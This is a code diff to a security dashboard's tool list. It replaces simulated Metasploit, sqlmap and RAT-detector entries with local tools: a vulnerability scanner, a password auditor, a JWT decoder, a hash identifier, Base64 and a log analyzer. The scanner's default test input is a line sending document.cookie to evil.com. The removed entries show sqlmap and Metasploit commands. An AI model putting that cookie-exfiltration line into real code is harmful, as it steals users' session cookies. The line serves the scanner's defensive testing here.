@@ -1,7 +1,7 @@
 import {
   Shield, Terminal, Wifi, Database, Globe, Zap,
   Fingerprint, Cookie, Eye, HardDrive, Search,
-  FileText, Network,
+  FileText, Network, Key, Lock, Hash, FileCheck,
 } from 'lucide-react';
 import type { HackTool } from './types';
 import {
@@ -14,6 +14,14 @@ import {
   testDNSExposure,
   generateHostsFile,
 } from './scanners';
+import {
+  scanForVulnerabilities,
+  analyzePassword,
+  analyzeLogs,
+  identifyHash,
+  decodeJWT,
+  base64,
+} from '../../engine/SecurityToolkit';
 
 export const TOOLS: HackTool[] = [
   // ── REAL TOOLS ─────────────────────────────────────────────
@@ -73,65 +81,111 @@ export const TOOLS: HackTool[] = [
     isReal: true, runner: generateHostsFile,
     command: 'dragon_hosts --generate --block-telemetry --download', duration: 0,
   },
-  // ── SIMULATED TOOLS ────────────────────────────────────────
+  // ── SECURITY TOOLKIT (REAL) ────────────────────────────────
   {
-    id: 'msf', name: 'Metasploit Scanner', nameAr: 'ماسح ميتاسبلويت',
-    icon: Terminal, color: '#FF0040', category: 'exploit',
-    description: 'Network vulnerability scanner (simulated)',
-    isReal: false, command: 'msf> use auxiliary/scanner/portscan/tcp',
-    simulatedOutput: [
-      '[*] Initializing Metasploit Framework v6.4...',
-      '[*] Loading module: auxiliary/scanner/portscan/tcp',
-      '[+] Target: 192.168.1.0/24',
-      '[*] Scanning 254 hosts...',
-      '[+] 192.168.1.1:22   - SSH (OpenSSH 8.9)',
-      '[+] 192.168.1.1:443  - HTTPS (TLS 1.3)',
-      '[+] 192.168.1.100:11434 - Ollama API ✅ SOVEREIGN',
-      '[*] Scan complete. 3 services found.',
-    ], duration: 3000,
+    id: 'vuln_scan', name: 'Code Vulnerability Scanner', nameAr: 'ماسح الثغرات',
+    icon: Terminal, color: '#FF0040', category: 'real',
+    description: 'Scans code for XSS, SQLi, hardcoded secrets, eval usage',
+    isReal: true,
+    runner: async () => {
+      const testCode = document.querySelector('.cm-content')?.textContent
+        || localStorage.getItem('haven-ollama-active-endpoint') || 'const x = eval(userInput); fetch("http://evil.com?d=" + document.cookie);';
+      const results = scanForVulnerabilities(testCode, 'active-file');
+      if (results.length === 0) return '[+] No vulnerabilities detected. Code is clean.';
+      return results.map(r => `[${r.severity}] ${r.type} at line ${r.line}: ${r.message}\n    ${r.snippet}`).join('\n\n');
+    },
+    command: 'haven_vuln_scan --xss --sqli --secrets --eval', duration: 0,
   },
   {
-    id: 'sqlmap', name: 'SQLMap Injection Test', nameAr: 'فحص حقن SQL',
-    icon: Database, color: '#FF6B00', category: 'exploit',
-    description: 'SQL injection vulnerability tester (simulated)',
-    isReal: false, command: "sqlmap -u 'http://target/api?id=1' --dbs",
-    simulatedOutput: [
-      '[*] Starting sqlmap v1.8...',
-      '[*] Testing parameter: id',
-      '[+] Parameter "id" is vulnerable (time-based blind)',
-      '[+] Back-end DBMS: MySQL >= 5.7',
-      '[!] WARNING: This is a SIMULATION.',
-      '[*] Recommendation: Use parameterized queries.',
-    ], duration: 3000,
+    id: 'password_audit', name: 'Password Strength Auditor', nameAr: 'مدقق قوة كلمة المرور',
+    icon: Key, color: '#FFD700', category: 'real',
+    description: 'Analyzes password strength with entropy calculation',
+    isReal: true,
+    runner: async () => {
+      const pw = prompt('Enter password to audit (local only, never sent anywhere):') || 'P@ssw0rd123';
+      const a = analyzePassword(pw);
+      return [
+        `[*] Password Strength Auditor`,
+        `    Score: ${a.score}/100 (${a.strength})`,
+        `    Entropy: ${a.entropy.toFixed(1)} bits`,
+        `    Length: ${a.length}`,
+        `    Crack Time: ${a.estimatedCrackTime}`,
+        a.suggestions.length > 0 ? `    Suggestions:\n${a.suggestions.map(s => `      - ${s}`).join('\n')}` : '    No suggestions — strong password.',
+      ].join('\n');
+    },
+    command: 'haven_password_audit --entropy --crack-time', duration: 0,
   },
   {
-    id: 'nj_rat', name: 'NJ_RAT Detector', nameAr: 'كاشف الاختراق',
-    icon: Eye, color: '#FF4444', category: 'defense',
-    description: 'Remote Access Trojan detection (simulated)',
-    isReal: false, command: 'dragon_scan --detect-rat --deep',
-    simulatedOutput: [
-      '[*] DRAGON RAT Detector v2.0',
-      '[*] Scanning processes, registry, network...',
-      '    njRAT: NOT FOUND ✅',
-      '    DarkComet: NOT FOUND ✅',
-      '    AsyncRAT: NOT FOUND ✅',
-      '[+] System is CLEAN.',
-    ], duration: 2500,
+    id: 'jwt_decode', name: 'JWT Decoder', nameAr: 'فك تشفير JWT',
+    icon: Lock, color: '#00BFFF', category: 'real',
+    description: 'Decodes JWT tokens and checks expiration',
+    isReal: true,
+    runner: async () => {
+      const token = prompt('Paste JWT token:') || '';
+      if (!token.includes('.')) return '[!] Invalid JWT format. Must contain two dots.';
+      try {
+        const decoded = decodeJWT(token);
+        return [
+          '[+] JWT Decoded:',
+          `    Subject: ${decoded.sub || 'N/A'}`,
+          `    Issuer: ${decoded.iss || 'N/A'}`,
+          `    Issued: ${decoded.iat ? new Date(decoded.iat * 1000).toISOString() : 'N/A'}`,
+          `    Expires: ${decoded.exp ? new Date(decoded.exp * 1000).toISOString() : 'N/A'}`,
+          `    Expired: ${decoded.expired ? 'YES' : 'NO'}`,
+          `    All claims: ${JSON.stringify(decoded, null, 2)}`,
+        ].join('\n');
+      } catch (e) { return `[!] Failed to decode: ${e}`; }
+    },
+    command: 'haven_jwt --decode --check-expiry', duration: 0,
   },
   {
-    id: 'firewall', name: 'Telemetry Firewall', nameAr: 'جدار الحماية',
-    icon: Globe, color: '#00FF00', category: 'defense',
-    description: 'Block surveillance endpoints (simulated)',
-    isReal: false, command: 'dragon_firewall --block-telemetry --sovereign',
-    simulatedOutput: [
-      '[*] DRAGON Firewall — Sovereign Bypass Mode',
-      '[+] BLOCKED: telemetry.microsoft.com',
-      '[+] BLOCKED: telemetry.vscode.dev',
-      '[+] BLOCKED: analytics.google.com',
-      '[+] ALLOWED: localhost:11434 (Ollama) ✅',
-      '[*] 2,847 surveillance domains blocked.',
-      '[*] Sovereign mode: ACTIVE 🇸🇦',
-    ], duration: 2000,
+    id: 'hash_id', name: 'Hash Identifier', nameAr: 'محدد نوع الهاش',
+    icon: Hash, color: '#FF00FF', category: 'real',
+    description: 'Identifies hash types (MD5, SHA-1, SHA-256, bcrypt, etc.)',
+    isReal: true,
+    runner: async () => {
+      const hash = prompt('Paste a hash to identify:') || '';
+      if (!hash.trim()) return '[!] No hash provided.';
+      const types = identifyHash(hash.trim());
+      if (types.length === 0) return `[?] Unknown hash format: ${hash.slice(0, 40)}...`;
+      return [`[+] Hash Identifier Results:`, `    Input: ${hash.slice(0, 60)}${hash.length > 60 ? '...' : ''}`, `    Possible types:`, ...types.map(t => `      - ${t}`)].join('\n');
+    },
+    command: 'haven_hash --identify', duration: 0,
+  },
+  {
+    id: 'base64_tool', name: 'Base64 Encode/Decode', nameAr: 'ترميز/فك Base64',
+    icon: FileCheck, color: '#00FFAA', category: 'real',
+    description: 'Encode or decode Base64 strings',
+    isReal: true,
+    runner: async () => {
+      const input = prompt('Enter text (prefix with "d:" to decode, otherwise encodes):') || '';
+      if (input.startsWith('d:')) {
+        const decoded = base64.decode(input.slice(2));
+        return `[+] Decoded:\n${decoded}`;
+      }
+      return `[+] Encoded:\n${base64.encode(input)}`;
+    },
+    command: 'haven_base64 --encode / --decode', duration: 0,
+  },
+  {
+    id: 'log_analyzer', name: 'Log Analyzer', nameAr: 'محلل السجلات',
+    icon: Eye, color: '#FF6B00', category: 'real',
+    description: 'Analyzes log text for failed logins, IPs, errors',
+    isReal: true,
+    runner: async () => {
+      const logText = prompt('Paste log lines (or sample will be used):') || 'Failed password for admin from 192.168.1.50\nFailed password for root from 10.0.0.5\nAccepted publickey for user\nERROR: Connection refused\nWARNING: disk space low';
+      const a = analyzeLogs(logText);
+      return [
+        `[*] Log Analysis:`,
+        `    Total lines: ${a.totalLines}`,
+        `    Errors: ${a.errorCount}`,
+        `    Warnings: ${a.warningCount}`,
+        `    Failed logins: ${a.failedLogins}`,
+        `    Unique IPs: ${a.uniqueIPs.join(', ') || 'none'}`,
+        a.suspiciousPatterns.length > 0 ? `    Suspicious:\n${a.suspiciousPatterns.map(p => `      [!] ${p}`).join('\n')}` : '    No suspicious patterns.',
+      ].join('\n');
+    },
+    command: 'haven_log --analyze --detect-brute-force', duration: 0,
   },
 ];
 
